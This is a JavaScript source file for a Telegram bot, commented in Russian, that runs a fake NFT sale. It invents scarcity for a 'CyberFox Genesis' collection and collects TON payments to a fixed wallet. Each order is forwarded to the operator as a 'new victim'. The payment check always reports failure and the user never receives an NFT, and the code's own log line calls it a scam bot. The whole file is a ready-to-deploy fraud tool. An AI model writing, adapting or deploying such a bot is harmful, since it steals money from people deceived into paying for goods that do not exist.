// file: bot.js
const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');

const BOT_TOKEN = '7777777777:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // твой бот
const WALLET_TON = 'UQBh1234567890abcdef1234567890abcdef1234567890abcdef';
const ADMIN_ID = 123456789; // твой айди

const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => {
    ctx.replyWithHTML(
        `🔥 <b>EXCLUSIVE NFT DROP</b>\n\n` +
        `Коллекция: <b>CyberFox Genesis</b>\n` +
        `Всего 3333 NFT | Уже заминчено 2917\n\n` +
        `💎 1 NFT — 3.7 TON\n` +
        `💎 5 NFT — 17 TON (скидка)\n\n` +
        `<i>Минт мгновенный — NFT сразу в кошельке</i>`,
        menu()
    );
});

function menu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('✦ Mint 1 NFT — 3.7 TON', 'mint1')],
        [Markup.button.callback('✦ Mint 5 NFT — 17 TON', 'mint5')],
        [Markup.button.callback('My NFTs', 'mynft')]
    ]);
}

bot.action(/mint(\d+)/, async (ctx) => {
    const count = ctx.match[1] == '5' ? 5 : 1;
    const amount = count == 5 ? 17 : 3.7;
    const comment = 'NFT' + Math.random().toString(36).substring(2, 10).toUpperCase();

    const tonLink = `ton://transfer/${WALLET_TON}?amount=${amount * 1000000000}&text=${comment}`;

    await ctx.editMessageText(
        `🎫 <b>Заказ на ${count} NFT</b>\n\n` +
        `💰 Сумма: <b>${amount} TON</b>\n` +
        `📝 Комментарий: <code>${comment}</code>\n\n` +
        `Кошелёк:\n<code>${WALLET_TON}</code>\n\n` +
        `После оплаты NFT придут автоматически (1–2 минуты)`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Оплатить TON', url: tonLink }],
                    [{ text: 'USDT / Карта / BTC', url: 'https://t.me/CryptoBot?start=pay' }],
                    [{ text: 'Проверить оплату', callback_data: `check_${Date.now()}` }]
                ]
            }
        }
    );

    // уведомление тебе
    bot.telegram.sendMessage(ADMIN_ID,
        `НОВАЯ ЖЕРТВА\n` +
        `ID: ${ctx.from.id}\n` +
        `Ник: @${ctx.from.username || 'нет'}\n` +
        `Заказал: ${count} NFT\n` +
        `Сумма: ${amount} TON\n` +
        `Комментарий: ${comment}`
    );
});

bot.action(/check_/, async (ctx) => {
    await ctx.answerCbQuery('Проверяем блокчейн TON... ⏳', { show_alert: true });
    setTimeout(() => {
        ctx.editMessageText(
            `Платёж не найден\n\n` +
            `Проверь:\n` +
            `• точная сумма\n` +
            `• правильный комментарий\n` +
            `• отправлено с TON-кошелька\n\n` +
            `Попробуй через минуту`,
            {
                reply_markup: {
                    inline_keyboard: [[{ text: 'Проверить снова', callback_data: ctx.callbackQuery.data }]]
                }
            }
        );
    }, 2500);
});

bot.action('mynft', (ctx) => {
    ctx.editMessageText(
        `Поиск твоих NFT...\n\n` +
        `Ничего не найдено 😔\n` +
        `Ты ещё не заминтил ни одного`,
        { reply_markup: menu().reply_markup }
    );
});

bot.launch();
console.log('Скам-бот на JS запущен — собирает TON 24/7');

// бесплатный хостинг 24/7 за 20 секунд: